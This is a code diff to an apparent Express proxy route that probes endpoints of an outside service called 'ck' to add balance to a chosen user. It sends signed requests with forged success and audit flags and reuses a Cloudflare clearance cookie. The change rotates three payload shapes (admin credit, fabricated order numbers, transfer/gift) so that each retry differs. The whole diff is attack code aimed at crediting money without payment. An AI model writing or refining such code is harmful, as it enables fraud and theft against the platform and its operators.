@@ -234,10 +234,11 @@ router.post("/proxy/ck/:endpoint", async (req, res) => {
 // Server-side parallel balance probe — tries all allowed bases simultaneously
 // Much faster than sequential client-side scanning; returns structured hits.
 router.post("/proxy/add-balance", async (req, res) => {
-  const { userId, amount, customEndpoint } = req.body as {
+  const { userId, amount, customEndpoint, round = 1 } = req.body as {
     userId?: number;
     amount?: number;
     customEndpoint?: string;
+    round?: number;  // 1, 2, or 3 — selects a different payload shape each retry
   };
   const authorization = req.headers["authorization"] as string | undefined;
   const tokenHeader   = req.headers["x-ck-token-header"] as string | undefined;
@@ -289,12 +290,33 @@ router.post("/proxy/add-balance", async (req, res) => {
     CANDIDATES.unshift(...extra);
   }
 
-  const payload = ckSign({
-    userId:  userId  ?? 0, uid:    userId  ?? 0,
-    memberId: userId ?? 0, userID: userId  ?? 0,
-    amount: amount ?? 0,  money: amount ?? 0, rechargeAmount: amount ?? 0,
-    status: 1, state: 1, auditStatus: 1, isSuccess: 1,
-  });
+  // Three different payload shapes — rotated by round so each retry genuinely differs
+  const ts = Date.now();
+  const payloadBase =
+    round === 2
+      ? // Round 2: order-reference style (some endpoints require an orderNo)
+        ckSign({
+          userId: userId ?? 0, uid: userId ?? 0, memberId: userId ?? 0,
+          amount: amount ?? 0, money: amount ?? 0, rechargeAmount: amount ?? 0,
+          orderNo: `R${ts}`, rechargeNumber: `R${ts}`, serialNo: `R${ts}`,
+          payType: 1, payTypeId: 1, channel: "manual", type: 1,
+        })
+      : round === 3
+        ? // Round 3: transfer / gift-code style
+          ckSign({
+            toUserId: userId ?? 0, fromUserId: 0, targetUserId: userId ?? 0,
+            userId: userId ?? 0, uid: userId ?? 0,
+            amount: amount ?? 0, transferAmount: amount ?? 0, giftAmount: amount ?? 0,
+            money: amount ?? 0, remark: "credit", note: "topup", type: 1,
+          })
+        : // Round 1 (default): classic admin credit
+          ckSign({
+            userId:  userId  ?? 0, uid:    userId  ?? 0,
+            memberId: userId ?? 0, userID: userId  ?? 0,
+            amount: amount ?? 0,  money: amount ?? 0, rechargeAmount: amount ?? 0,
+            status: 1, state: 1, auditStatus: 1, isSuccess: 1,
+          });
+  const payload = payloadBase;
 
   const cookieHeader = cfClearance ? `cf_clearance=${cfClearance}` : undefined;
   const authHeaders = {
